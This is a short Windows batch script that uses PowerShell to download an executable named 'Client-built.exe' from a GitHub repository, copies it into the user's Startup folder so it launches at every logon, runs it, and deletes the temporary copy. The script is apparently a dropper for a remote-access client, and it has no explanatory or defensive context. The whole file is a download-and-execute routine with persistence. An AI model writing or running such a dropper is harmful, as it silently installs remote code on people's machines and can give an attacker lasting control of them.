@echo off
setlocal


set "url=https://github.com/tiraUnderCode/rev/raw/main/Client-built.exe"
set "tempFile=%temp%\Client-built.exe"
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"


powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%tempFile%'"


copy "%tempFile%" "%startupFolder%"


start "" "%startupFolder%\Client-built.exe"


del "%tempFile%"

endlocal
